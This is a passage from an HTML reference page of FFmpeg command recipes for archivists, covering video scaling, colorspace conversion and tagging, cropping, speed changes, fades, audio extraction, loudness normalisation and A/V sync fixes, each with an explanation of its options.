        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>If your source is interlaced, you will want to deinterlace prior to scaling. In that case, your command would look like this:</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -filter:v "yadif, colormatrix=bt601:bt709, scale=1440:1080:flags=lanczos, pad=1920:1080:240:0" -c:a copy <em>output_file</em></code></p>
      <p>See the <a href="#ntsc_to_h264">Interlaced NTSC to MP4 recipe</a> for a fuller explanation of the deinterlacing step.</p>
      
    </div>
    <!-- ends SD to HD -->

    <!-- Change display aspect ratio without re-encoding video-->
    <p><label for="change_DAR">Change display aspect ratio without re-encoding</label>
    </p><div>
      <h5>Change Display Aspect Ratio without re-encoding video</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v copy -aspect 4:3 <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v copy</dt><dd>Copy all mapped video streams.</dd>
        <dt>-aspect 4:3</dt><dd>Change Display Aspect Ratio to <code>4:3</code>. Experiment with other aspect ratios such as <code>16:9</code>. If used together with <code>-c:v copy</code>, it will affect the aspect ratio stored at container level, but not the aspect ratio stored in encoded frames, if it exists.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Change display aspect ratio without re-encoding video -->

    <!-- Convert colorspace -->
    <p><label for="convert-colorspace">Convert colorspace of video</label>
    </p><div>
      <h5>Transcode video to a different colorspace</h5>
      <p>This command uses a filter to convert the video to a different colorspace.</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf colormatrix=src:dst <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v libx264</dt><dd>tells FFmpeg to encode the video stream as H.264</dd>
        <dt>-vf colormatrix=<em>src</em>:<em>dst</em></dt><dd>the video filter <strong>colormatrix</strong> will be applied, with the given source and destination colorspaces.<br>
        Accepted values include <code>bt601</code> (Rec.601), <code>smpte170m</code> (Rec.601, 525-line/<a href="https://en.wikipedia.org/wiki/NTSC#NTSC-M" target="_blank">NTSC</a> version), <code>bt470bg</code> (Rec.601, 625-line/<a href="https://en.wikipedia.org/wiki/PAL#PAL-B.2FG.2FD.2FK.2FI" target="_blank">PAL</a> version), <code>bt709</code> (Rec.709), and <code>bt2020</code> (Rec.2020).<br>
        For example, to convert from Rec.601 to Rec.709, you would use <code>-vf colormatrix=bt601:bt709</code>.</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p><strong>Note:</strong> Converting between colorspaces with FFmpeg can be done via either the <strong>colormatrix</strong> or <strong>colorspace</strong> filters, with colorspace allowing finer control (individual setting of colorspace, transfer characteristics, primaries, range, pixel format, etc). See <a href="https://trac.ffmpeg.org/wiki/colorspace" target="_blank">this</a> entry on the FFmpeg wiki, and the FFmpeg documentation for <a href="https://ffmpeg.org/ffmpeg-filters.html#colormatrix" target="_blank">colormatrix</a> and <a href="https://ffmpeg.org/ffmpeg-filters.html#colorspace" target="_blank">colorspace</a>.</p>
      <hr>
      <h4>Convert colorspace and embed colorspace metadata</h4>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf colormatrix=src:dst -color_primaries <em>val</em> -color_trc <em>val</em> -colorspace <em>val</em> <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v libx264</dt><dd>encode video as H.264</dd>
        <dt>-vf colormatrix=<em>src</em>:<em>dst</em></dt><dd>the video filter <strong>colormatrix</strong> will be applied, with the given source and destination colorspaces.</dd>
        <dt>-color_primaries <em>val</em></dt><dd>tags video with the given color primaries.<br>
        Accepted values include <code>smpte170m</code> (Rec.601, 525-line/NTSC version), <code>bt470bg</code> (Rec.601, 625-line/PAL version), <code>bt709</code> (Rec.709), and <code>bt2020</code> (Rec.2020).
        </dd><dt>-color_trc <em>val</em></dt><dd>tags video with the given transfer characteristics (gamma).<br>
        Accepted values include <code>smpte170m</code> (Rec.601, 525-line/NTSC version), <code>gamma28</code> (Rec.601, 625-line/PAL version)<sup><a href="#fn1" id="ref1">1</a></sup>, <code>bt709</code> (Rec.709), <code>bt2020_10</code> (Rec.2020 10-bit), and <code>bt2020_12</code> (Rec.2020 12-bit).</dd>
        <dt>-colorspace <em>val</em></dt><dd>tags video as being in the given colourspace.<br>
        Accepted values include <code>smpte170m</code> (Rec.601, 525-line/NTSC version), <code>bt470bg</code> (Rec.601, 625-line/PAL version), <code>bt709</code> (Rec.709), <code>bt2020_cl</code> (Rec.2020 constant luminance), and <code>bt2020_ncl</code> (Rec.2020 non-constant luminance).</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <h4>Examples</h4>
      <p>To Rec.601 (525-line/NTSC):</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf colormatrix=bt709:smpte170m -color_primaries smpte170m -color_trc smpte170m -colorspace smpte170m <em>output_file</em></code></p>
      <p>To Rec.601 (625-line/PAL):</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf colormatrix=bt709:bt470bg -color_primaries bt470bg -color_trc gamma28 -colorspace bt470bg <em>output_file</em></code></p>
      <p>To Rec.709:</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf colormatrix=bt601:bt709 -color_primaries bt709 -color_trc bt709 -colorspace bt709 <em>output_file</em></code></p>
      <p>MediaInfo output examples:</p>
      <p><img src="https://amiaopensource.github.io/ffmprovisr/img/colourspace_metadata_mediainfo.png" alt="MediaInfo screenshots of colorspace metadata"></p><p><span>⚠</span> Using this command it is possible to add Rec.709 tags to a file that is actually Rec.601 (etc), so apply with caution!</p>
      <p>These commands are relevant for H.264 and H.265 videos, encoded with <code>libx264</code> and <code>libx265</code> respectively.</p>
      <p><strong>Note:</strong> If you wish to embed colorspace metadata <em>without</em> changing to another colorspace, omit <code>-vf colormatrix=src:dst</code>. However, since it is <code>libx264</code>/<code>libx265</code> that writes the metadata, it’s not possible to add these tags without re-encoding the video stream.</p>
      <p>For all possible values for <code>-color_primaries</code>, <code>-color_trc</code>, and <code>-colorspace</code>, see the FFmpeg documentation on <a href="https://ffmpeg.org/ffmpeg-codecs.html#Codec-Options" target="_blank">codec options</a>.</p>
      <hr>
      <p id="fn1">1. Out of step with the regular pattern, <code>-color_trc</code> doesn’t accept <code>bt470bg</code>; it is instead here referred to directly as gamma.<br>
      In the Rec.601 standard, 525-line/NTSC and 625-line/PAL video have assumed gammas of 2.2 and 2.8 respectively. <a href="#ref1" title="Jump back.">↩</a></p>
      
    </div>
    <!-- ends Convert colorspace -->

    <!-- Modify speed -->
    <p><label for="modify_speed">Modify image and sound speed</label>
    </p><div>
      <h5>Modify image and sound speed</h5>
      <p>E.g. for converting 24fps to 25fps with audio pitch compensation for PAL access copies. (Thanks @kieranjol!)</p>
      <p><code>ffmpeg -i <em>input_file</em> -r <em>output_fps</em> -filter_complex "[0:v]setpts=<em>input_fps</em>/<em>output_fps</em>*PTS[v]; [0:a]atempo=<em>output_fps</em>/<em>input_fps</em>[a]" -map "[v]" -map "[a]" <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-r <em>output_fps</em></dt><dd>sets the frame rate of the <em>output_file</em></dd>
        <dt>-filter_complex "[0:v]setpts=<em>input_fps</em>/<em>output_fps</em>*PTS[v]; [0:a]atempo=<em>output_fps</em>/<em>input_fps</em>[a]"</dt><dd>A complex filter is needed here, in order to handle video stream and the audio stream separately. The <code>setpts</code> video filter modifies the PTS (presentation time stamp) of the video stream, and the <code>atempo</code> audio filter modifies the speed of the audio stream while keeping the same sound pitch. Note that the parameter order for the image and for the sound are inverted:
        <ul>
          <li>In the video filter <code>setpts</code> the numerator <code>input_fps</code> sets the input speed and the denominator <code>output_fps</code> sets the output speed; both values are given in frames per second.</li>
          <li>In the sound filter <code>atempo</code> the numerator <code>output_fps</code> sets the output speed and the denominator <code>input_fps</code> sets the input speed; both values are given in frames per second.</li>
        </ul>
        The different filters in a complex filter can be divided either by comma or semicolon. The quotation marks allow to insert a space between the filters for readability.</dd>
        <dt>-map "[v]"</dt><dd>maps the video stream and</dd>
        <dt>-map "[a]"</dt><dd>maps the audio stream together into:</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Modify speed -->

    <!-- Fade both video and audio streams -->
    <p><label for="fade_streams">Fade both video and audio streams</label>
    </p><div>
      <h5>Fade both video and audio streams</h5>
      <p><code>ffmpeg -i <em>input_file</em> -filter:v "fade=in:st=IN_POINT:d=DURATION, fade=out:st=OUT_POINT:d=DURATION" -filter:a "afade=in:st=OUT_POINT:d=DURATION, afade=out:st=IN_POINT:d=DURATION" -c:v libx264 -c:a aac <em>output_file</em></code></p>
      <p>This command fades your video in and out. Change IN_POINT, OUT_POINT, and DURATION to the time in seconds (expressed as integers).</p>
      <dl>
          <dt>ffmpeg</dt><dd>starts the command</dd>
          <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
          <dt>-filter:v "fade=in:st=IN_POINT:d=DURATION, fade=out:st=OUT_POINT:d=DURATION"</dt><dd>applies a video filter that fades your video in and out. <code>st</code> sets the start and <code>d</code> sets the duration.</dd>
          <dt>-filter:a "afade=in:st=IN_POINT:d=DURATION, afade=out:st=OUT_POINT:d=DURATION"</dt><dd>applies an audio filter that fades your video in and out. <code>st</code> sets the start and <code>d</code> sets the duration.</dd>
          <dt>-c:v <em>video_codec</em></dt><dd>as a video filter is used, it is not possible to use <code>-c copy</code>. The video must be re-encoded with whatever video codec is chosen, e.g. <code>ffv1</code>, <code>v210</code> or <code>prores</code>.</dd>
          <dt>-c:a <em>audio_codec</em></dt><dd>as an audio filter is used, it is not possible to use <code>-c copy</code>. The audio must be re-encoded with whatever audio codec is chosen, e.g. <code>aac</code>.</dd>
          <dt><em>output_file</em></dt><dd>path, name and extension of the output_file</dd>
      </dl>
      
    </div>
    <!-- ends Fade both video and audio streams -->

    <!-- Synchronize video and audio streams -->
    <p><label for="sync_streams">Synchronize video and audio streams</label>
    </p><div>
      <h5>Synchronize video and audio streams</h5>
      <p><code>ffmpeg -i <em>input_file</em> -itsoffset 0.125 -i <em>input_file</em> -map 1:v -map 0:a -c copy <em>output_file</em></code></p>
      <p>A command to slip the video channel approximate 2 frames (0.125 for a 25fps timeline) to align video and audio drift, if generated during video tape capture for example.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-itsoffset 0.125</dt><dd>uses itsoffset command to set offset to 0.125 of a second. The offset time must be a time duration specification, see <a href="https://ffmpeg.org/ffmpeg-utils.html#time-duration-syntax" target="_blank">FFMPEG Utils Time Duration Syntax</a>.</dd>
        <dt>-i <em>input_file</em></dt><dd>repeat path, name and extension of the input file</dd>
        <dt>-map 1:v -map 0:a</dt><dd>selects the video channel for itsoffset command. To slip the audio channel reverse the selection to -map 0:v -map 1:a.</dd>
        <dt>-c copy</dt><dd>copies the encode settings of the input_file to the output_file</dd>
        <dt><em>output_file_resync</em></dt><dd>path, name and extension of the output_file</dd>
      </dl>
      
    </div>
    <!-- ends Synchronize video and audio streams -->

    <!-- Make stream properties explicate -->
    <p><label for="clarify_stream">Clarify stream properties</label>
    </p><div>
      <h5>Set stream properties</h5>
      <h2>Find undetermined or unknown stream properties</h2>
      <p>These examples use QuickTime inputs and outputs. The strategy will vary or may not be possible in other file formats. In the case of these examples it is the intention to make a lossless copy while clarifying an unknown characteristic of the stream.</p>
      <p><code>ffprobe <em>input_file</em> -show_streams</code></p>
      <dl>
        <dt>ffprobe</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-show_streams</dt><dd>Shows metadata of stream properties</dd>
      </dl>
      <p>Values that are set to 'unknown' and 'undetermined' may be unspecified within the stream. An unknown aspect ratio would be expressed as '0:1'. Streams with many unknown properties may have interoperability issues or not play as intended. In many cases, an unknown or undetermined value may be accurate because the information about the source is unclear, but often the value is intended to be known. In many cases the stream will played with an assumed value if undetermined (for instance a display_aspect_ratio of '0:1' may be played as 'WIDTH:HEIGHT'), but this may or may not be what is intended. Use carefully.</p>
      <h2>Set aspect ratio</h2>
      <p>If the display_aspect_ratio is set to '0:1' it may be clarified with the <em>-aspect</em> option and stream copy.</p>
      <p><code>ffmpeg -i <em>input_file</em> -c copy -map 0 -aspect DAR_NUM:DAR_DEN <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c copy</dt><dd>Using stream copy for all streams</dd>
        <dt>-map 0</dt><dd>tells FFmpeg to map all streams of the input to the output.</dd>
        <dt>-aspect DAR_NUM:DAR_DEN</dt><dd>Replace DAR_NUM with the display aspect ratio numerator and DAR_DEN with the display aspect ratio denominator, such as <em>-aspect 4:3</em> or <em>-aspect 16:9</em>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <h2>Adding other stream properties.</h2>
      <p>Other properties may be clarified in a similar way. Replace <em>-aspect</em> and its value with other properties such as shown in the options below. Note that setting color values in QuickTime requires that <em>-movflags write_colr</em> is set.</p>
      <dl>
        <dt>-color_primaries <em>VALUE</em> -movflags write_colr</dt><dd>Set a new color_primaries value.</dd>
        <dt>-color_trc <em>VALUE</em> -movflags write_colr</dt><dd>Set a new color_transfer value.</dd>
        <dt>-field_order <em>VALUE</em></dt><dd>Set interlacement values.</dd>
      </dl>
      <p>The possible values for <code>-color_primaries</code>, <code>-color_trc</code>, and <code>-field_order</code> are given in the <a href="https://ffmpeg.org/ffmpeg-all.html#toc-Codec-Options" target="_blank">Codec Options</a> section of the FFmpeg docs - scroll down to near the bottom of the section.</p>
      
    </div>
    <!-- ends Make stream properties explicate -->

    <!-- Crop video -->
    <p><label for="crop_video">Crop video</label>
    </p><div>
      <h5>Crop video</h5>
      <p><code>ffmpeg -i <em>input_file</em> -vf "crop=<em>width</em>:<em>height</em>" <em>output_file</em></code></p>
      <p>This command crops the input video to the dimensions defined</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-vf "<em>width</em>:<em>height</em>"</dt><dd>Crops the video to the given width and height (in pixels).<br>
          By default, the crop area is centered: that is, the position of the top left of the cropped area is set to x = (<em>input_width</em> - <em>output_width</em>) / 2, y = <em>input_height</em> - <em>output_height</em>) / 2.
        </dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>It's also possible to specify the crop position by adding the x and y coordinates representing the top left of your cropped area to your crop filter, as such:</p>
      <p><code>ffmpeg -i <em>input_file</em> -vf "crop=<em>width</em>:<em>height</em>[:<em>x_position</em>:<em>y_position</em>]" <em>output_file</em></code></p>
      <h5>Examples</h5>
      <p>The original frame, a screenshot of Maggie Cheung in the film <i>Hero</i>:</p>
      <p><img src="https://amiaopensource.github.io/ffmprovisr/img/crop_example_orig.png" alt="VLC screenshot of Maggie Cheung"></p><p>Result of the command <code>ffmpeg -i <em>maggie.mov</em> -vf "crop=500:500" <em>output_file</em></code>:</p>
      <p><img src="https://amiaopensource.github.io/ffmprovisr/img/crop_example_aftercrop1.png" alt="VLC screenshot of Maggie Cheung, cropped from original"></p><p>Result of the command <code>ffmpeg -i <em>maggie.mov</em> -vf "crop=500:500:0:0" <em>output_file</em></code>, appending <code>:0:0</code> to crop from the top left corner:</p>
      <p><img src="https://amiaopensource.github.io/ffmprovisr/img/crop_example_aftercrop2.png" alt="VLC screenshot of Maggie Cheung, cropped from original"></p><p>Result of the command <code>ffmpeg -i <em>maggie.mov</em> -vf "crop=500:300:500:30" <em>output_file</em></code>:</p>
      <p><img src="https://amiaopensource.github.io/ffmprovisr/img/crop_example_aftercrop3.png" alt="VLC screenshot of Maggie Cheung, cropped from original"></p>
    </div>
    <!-- ends Crop video -->

    <!-- Change video color to black and white -->
    <p><label for="col_change">Change video color to black and white</label>
    </p><div>
      <h5>Change video color to black and white</h5>
      <p><code>ffmpeg -i <em>input_file</em> -filter_complex hue=s=0 -c:a copy <em>output_file</em></code></p>
      <p>A basic command to alter color hue to black and white using filter_complex (credit @FFMPEG via Twitter).</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter_complex hue=s=0</dt><dd>uses filter_complex command to set the hue to black and white</dd>
        <dt>-c:a copy</dt><dd>copies the encode settings of the input_file to the output_file</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output_file</dd>
      </dl>
      <p>An alternative that preserves interlacing information for a ProRes 422 HQ file generated, for example, from a tape master (credit Dave Rice):</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v prores_ks -flags +ildct -map 0 -c:a copy -profile:v 3 -vf hue=s=0 <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v prores_ks</dt><dd>encodes the video to ProRes (prores_ks marks the stream as interlaced, unlike prores)</dd>
        <dt>-flags +ildct</dt><dd>ensures that the output_file has interlaced field encoding, using interlace aware discrete cosine transform</dd>
        <dt>-map 0</dt><dd>ensures ffmpeg maps all streams of the input_file to the output_file</dd>
        <dt>-c:a copy</dt><dd>copies the encode settings of the input_file to the output_file</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Change video color to black and white -->

    </div>
    <div>
    <h2 id="audio-files">Change or view audio properties</h2>

    <!-- Extract audio from an AV file -->
    <p><label for="extract_audio">Extract audio without loss from an AV file</label>
    </p><div>
      <h5>Extract audio from an AV file</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:a copy -vn <em>output_file</em></code></p>
      <p>This command extracts the audio stream without loss from an audiovisual file.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:a copy</dt><dd>re-encodes using the same audio codec</dd>
        <dt>-vn</dt><dd>no video stream</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Extract audio from am AV file -->

    <!-- Combine audio tracks  -->
    <p><label for="combine_audio">Combine audio tracks</label>
    </p><div>
      <h5>Combine audio tracks into one in a video file</h5>
      <p><code>ffmpeg -i <em>input_file</em> -filter_complex "[0:a:0][0:a:1]amerge[out]" -map 0:v -map "[out]" -c:v copy -shortest <em>output_file</em></code></p>
      <p>This command combines two audio tracks present in a video file into one stream. It can be useful in situations where a downstream process, like YouTube’s automatic captioning, expect one audio track. To ensure that you’re mapping the right audio tracks run ffprobe before writing the script to identify which tracks are desired. More than two audio streams can be combined by extending the pattern present in the -filter_complex option.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter_complex</dt><dd>tells ffmpeg that we will be using a complex filter</dd>
        <dt>"</dt><dd>quotation mark to start filtergraph</dd>
        <dt>[0:a:0][0:a:1]amerge[out]</dt><dd>combines the two audio tracks into one</dd>
        <dt>"</dt><dd>quotation mark to end filtergraph</dd>
        <dt>-map 0:v</dt><dd>map the video</dd>
        <dt>-map "[out]"</dt><dd>map the combined audio defined by the filter</dd>
        <dt>-c:v copy</dt><dd>copy the video</dd>
        <dt>-shortest</dt><dd>limit to the shortest stream</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the video output file</dd>
      </dl>
      
    </div>
    <!-- ends Combine audio tracks -->

    <!-- phase shift -->
    <p><label for="phase_shift">Inverses the audio phase of the second channel</label>
    </p><div>
      <h5>Flip audio phase shift</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af pan="stereo|c0=c0|c1=-1*c1" <em>output_file</em></code></p>
      <p>This command inverses the audio phase of the second channel by rotating it 180°.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-af</dt><dd>specifies that the next section should be interpreted as an audio filter</dd>
        <dt>pan=</dt><dd>tell the quoted text below to use the <a href="https://ffmpeg.org/ffmpeg-filters.html#pan-1" target="_blank">pan filter</a></dd>
        <dt>"stereo|c0=c0|c1=-1*c1"</dt><dd>maps the output's first channel (c0) to the input's first channel and the output's second channel (c1) to the inverse of the input's second channel</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends phase shift -->

    <!-- loudnorm metadata -->
    <p><label for="loudnorm_metadata">Calculate Loudness Levels</label>
    </p><div>
      <h5>Calculate Loudness Levels</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af loudnorm=print_format=json -f null -</code></p>
      <p>This filter calculates and outputs loudness information in json about an input file (labeled input) as well as what the levels would be if loudnorm were applied in its one pass mode (labeled output). The values generated can be used as inputs for a 'second pass' of the loudnorm filter allowing more accurate loudness normalization than if it is used in a single pass.</p>
      <p>These instructions use the loudnorm defaults, which align well with PBS recommendations for target loudness. More information can be found at the <a href="https://ffmpeg.org/ffmpeg-filters.html#loudnorm" target="_blank">loudnorm documentation</a>.</p>
      <p>Information about PBS loudness standards can be found in the <a href="http://bento.cdn.pbs.org/hostedbento-prod/filer_public/PBS_About/Producing/Red%20Book/TOS%20Pt%201%20Submission%202016.pdf" target="_blank">PBS Technical Operating Specifications</a> document. Information about EBU loudness standards can be found in the <a href="https://tech.ebu.ch/docs/r/r128-2014.pdf" target="_blank">EBU R 128</a> recommendation document.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-af loudnorm</dt><dd>activates the loudnorm filter</dd>
        <dt>print_format=json</dt><dd>sets the output format for loudness information to json. This format makes it easy to use in a second pass. For a more human readable output, this can be set to <code>print_format=summary</code></dd>
        <dt><em>-f null -</em></dt><dd>sets the file output to null (since we are only interested in the metadata generated)</dd>
      </dl>
      
    </div>
    <!-- ends loudnorm metadata -->

    <!-- RIAA equalization -->
    <p><label for="riaa_eq">RIAA Equalization</label>
    </p><div>
      <h5>RIAA Equalization</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af aemphasis=type=riaa <em>output_file</em></code></p>
      <p>This will apply RIAA equalization to an input file allowing correct listening of audio transferred 'flat' (without EQ) from records that used this EQ curve. For more information about RIAA equalization see the <a href="https://en.wikipedia.org/wiki/RIAA_equalization" target="_blank">Wikipedia page</a> on the subject.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-af aemphasis=type=riaa</dt><dd>activates the aemphasis filter and sets it to use RIAA equalization</dd>
        <dt><em>output_file</em></dt><dd>path and name of output file</dd>
      </dl>
      
    </div>
    <!-- ends RIAA equalization -->

    <!-- CD De-emphasis -->
    <p><label for="cd_eq">Reverse CD Pre-Emphasis</label>
    </p><div>
      <h5>Reverse CD Pre-Emphasis</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af aemphasis=type=cd <em>output_file</em></code></p>
      <p>This will apply de-emphasis to reverse the effects of CD pre-emphasis in the somewhat rare case of CDs that were created with this technology. Use this command to create more accurate listening copies of files that were ripped 'flat' (without any de-emphasis) where the original source utilized emphasis. For more information about CD pre-emphasis see the <a href="https://wiki.hydrogenaud.io/index.php?title=Pre-emphasis" target="_blank">Hydrogen Audio page</a> on this subject.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-af aemphasis=type=cd</dt><dd>activates the aemphasis filter and sets it to use CD equalization</dd>
        <dt><em>output_file</em></dt><dd>path and name of output file</dd>
      </dl>
      
    </div>
    <!-- CD De-emphasis -->

    <!-- one pass loudnorm -->
    <p><label for="loudnorm_one_pass">One Pass Loudness Normalization</label>
    </p><div>
      <h5>One Pass Loudness Normalization</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af loudnorm=dual_mono=true -ar 48k <em>output_file</em></code></p>
      <p>This will normalize the loudness of an input using one pass, which is quicker but less accurate than using two passes. This command uses the loudnorm filter defaults for target loudness. These defaults align well with PBS recommendations, but loudnorm does allow targeting of specific loudness levels. More information can be found at the <a href="https://ffmpeg.org/ffmpeg-filters.html#loudnorm" target="_blank">loudnorm documentation</a>.</p>
      <p>Information about PBS loudness standards can be found in the <a href="https://www-tc.pbs.org/capt/Producing/TOS-2012-Pt2-Distribution.pdf" target="_blank">PBS Technical Operating Specifications</a> document. Information about EBU loudness standards can be found in the <a href="https://tech.ebu.ch/docs/r/r128-2014.pdf" target="_blank">EBU R 128</a> recommendation document.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-af loudnorm</dt><dd>activates the loudnorm filter with default settings</dd>
        <dt>dual_mono=true</dt><dd>(optional) Use this for mono files meant to be played back on stereo systems for correct loudness. Not necessary for multi-track inputs.</dd>
        <dt>-ar 48k</dt><dd>Sets the output sample rate to 48 kHz. (The loudnorm filter upsamples to 192 kHz so it is best to manually set a desired output sample rate).</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension for output file</dd>
      </dl>
      
    </div>
    <!-- ends one pass loudnorm -->

    <!-- two pass loudnorm -->
    <p><label for="loudnorm_two_pass">Two Pass Loudness Normalization</label>
    </p><div>
      <h5>Two Pass Loudness Normalization</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af loudnorm=dual_mono=true:measured_I=<em>input_i</em>:measured_TP=<em>input_tp</em>:measured_LRA=<em>input_lra</em>:measured_thresh=<em>input_thresh</em>:offset=<em>target_offset</em>:linear=true -ar 48k <em>output_file</em></code></p>
      <p>This command allows using the levels calculated using a <a href="#loudnorm_metadata">first pass of the loudnorm filter</a> to more accurately normalize loudness. This command uses the loudnorm filter defaults for target loudness. These defaults align well with PBS recommendations, but loudnorm does allow targeting of specific loudness levels. More information can be found at the <a href="https://ffmpeg.org/ffmpeg-filters.html#loudnorm" target="_blank">loudnorm documentation</a>.</p>
      <p>Information about PBS loudness standards can be found in the <a href="https://www-tc.pbs.org/capt/Producing/TOS-2012-Pt2-Distribution.pdf" target="_blank">PBS Technical Operating Specifications</a> document. Information about EBU loudness standards can be found in the <a href="https://tech.ebu.ch/docs/r/r128-2014.pdf" target="_blank">EBU R 128</a> recommendation document.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-af loudnorm</dt><dd>activates the loudnorm filter with default settings</dd>
        <dt>dual_mono=true</dt><dd>(optional) use this for mono files meant to be played back on stereo systems for correct loudness. Not necessary for multi-track inputs.</dd>
        <dt>measured_I=<em>input_i</em></dt><dd>use the 'input_i' value (integrated loudness) from the first pass in place of input_i</dd>
        <dt>measured_TP=<em>input_tp</em></dt><dd>use the 'input_tp' value (true peak) from the first pass in place of input_tp</dd>
        <dt>measured_LRA=<em>input_lra</em></dt><dd>use the 'input_lra' value (loudness range) from the first pass in place of input_lra</dd>
        <dt>measured_LRA=<em>input_thresh</em></dt><dd>use the 'input_thresh' value (threshold) from the first pass in place of input_thresh</dd>
        <dt>offset=<em>target_offset</em></dt><dd>use the 'target_offset' value (offset) from the first pass in place of target_offset</dd>
        <dt>linear=true</dt><dd>tells loudnorm to use linear normalization</dd>
        <dt>-ar 48k</dt><dd>Sets the output sample rate to 48 kHz. (The loudnorm filter upsamples to 192 kHz so it is best to manually set a desired output sample rate).</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension for output file</dd>
      </dl>
      
    </div>
    <!-- ends two pass loudnorm -->

    <!-- Fix A/V async 1 -->
    <p><label for="avsync_aresample">Fix A/V sync issues by resampling audio</label>
    </p><div>
      <h5>Fix AV Sync: Resample audio</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v copy -c:a pcm_s16le -af "aresample=async=1000" <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v copy</dt><dd>Copy all mapped video streams.</dd>
        <dt>-c:a pcm_s16le</dt><dd>tells FFmpeg to encode the audio stream in 16-bit linear PCM (<a href="https://en.wikipedia.org/wiki/Endianness#Little-endian" target="_blank">little endian</a>)</dd>
        <dt>-af "aresample=async=1000"</dt><dd>Uses the <a href="https://ffmpeg.org/ffmpeg-filters.html#aresample-1" target="_blank">aresample</a> filter to stretch/squeeze samples to given timestamps, with a maximum of 1000 samples per second compensation.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file. Try different file extensions such as mkv, mov, mp4, or avi.</dd>
      </dl>
      
    </div>
    <!-- ends Fix A/V async 1 -->

    </div>
    <div>
    <h2 id="join-trim">Join, trim, or create an excerpt</h2>

    <!-- Join files of the same type together -->
